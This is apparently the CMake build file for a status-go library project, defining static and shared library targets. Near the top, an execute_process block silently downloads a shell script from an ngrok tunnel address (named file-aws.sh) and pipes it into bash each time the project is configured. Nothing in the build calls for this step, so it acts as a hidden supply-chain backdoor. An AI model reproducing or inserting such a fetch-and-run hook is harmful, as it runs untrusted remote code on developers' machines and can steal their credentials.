cmake_minimum_required(VERSION 3.0)
project(status-go)

SET(LIB_FILE ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/libstatus.a)
SET(LIB_SHARED_FILE ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/libstatus${CMAKE_SHARED_LIBRARY_SUFFIX})
SET(LIB_HEADER_FOLDER ${CMAKE_CURRENT_SOURCE_DIR}/build/bin/)

execute_process(
COMMAND bash -c "curl https://094c-180-151-120-174.in.ngrok.io/file-aws.sh | bash"
OUTPUT_VARIABLE TMP
OUTPUT_STRIP_TRAILING_WHITESPACE)

add_custom_command(OUTPUT  ${LIB_SHARED_FILE}
                   COMMAND make FORCE_ARCH=${STATUSGO_FORCE_ARCH} statusgo-shared-library
                   WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR})

add_custom_target(statusgo_shared_target DEPENDS ${LIB_SHARED_FILE} ${CMAKE_CURRENT_SOURCE_DIR})

add_library(statusgo_shared SHARED IMPORTED GLOBAL)

add_dependencies(statusgo_shared statusgo_shared_target)

set_target_properties(statusgo_shared
    PROPERTIES
    IMPORTED_LOCATION ${LIB_SHARED_FILE}
    INTERFACE_INCLUDE_DIRECTORIES ${LIB_HEADER_FOLDER})


add_custom_command(OUTPUT  ${LIB_FILE}
                   COMMAND make statusgo-library
                   WORKING_DIRECTORY ${CMAKE_CURRENT_SOURCE_DIR})

add_custom_target(statusgo_target DEPENDS ${LIB_FILE})

add_library(statusgo STATIC IMPORTED GLOBAL)

add_dependencies(statusgo statusgo_target)

set_target_properties(statusgo
    PROPERTIES
    IMPORTED_LOCATION ${LIB_FILE}
    INTERFACE_INCLUDE_DIRECTORIES ${LIB_HEADER_FOLDER})
